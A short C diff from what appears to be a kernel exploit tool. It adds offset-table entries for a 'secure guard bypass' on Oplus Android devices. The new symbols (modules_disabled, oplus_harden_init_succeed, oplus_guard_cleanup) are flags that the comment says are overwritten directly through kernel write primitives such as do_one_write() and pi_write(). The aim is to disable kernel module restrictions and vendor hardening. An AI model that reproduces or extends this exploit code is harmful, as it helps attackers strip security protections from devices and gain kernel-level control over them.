@@ -189,6 +189,17 @@ static const struct {
   {"off_slide_nfulnl_logger", offsetof(struct kernel_offsets, off_slide_nfulnl_logger)},
   {"off_slide_loggers_0_1", offsetof(struct kernel_offsets, off_slide_loggers_0_1)},
   {"off_slide_boot_id", offsetof(struct kernel_offsets, off_slide_boot_id)},
+
+  /* W1.5 (ghostlock): oplus secure guard bypass.
+   * IMPORTANT: these values in offsets.json are ABSOLUTE kernel virtual
+   * addresses (BSS symbols living in the linear/direct map region), NOT
+   * KIMAGE_TEXT_BASE-relative offsets.  They must be passed directly to
+   * do_one_write() / pi_write() WITHOUT applying data_addr().  The generic
+   * symbol parser below still reads them into struct kernel_offsets correctly
+   * because they are plain uint64_t fields. */
+  {"off_modules_disabled", offsetof(struct kernel_offsets, off_modules_disabled)},
+  {"off_oplus_harden_init_succeed", offsetof(struct kernel_offsets, off_oplus_harden_init_succeed)},
+  {"off_oplus_guard_cleanup", offsetof(struct kernel_offsets, off_oplus_guard_cleanup)},
 };
 
 static const struct {
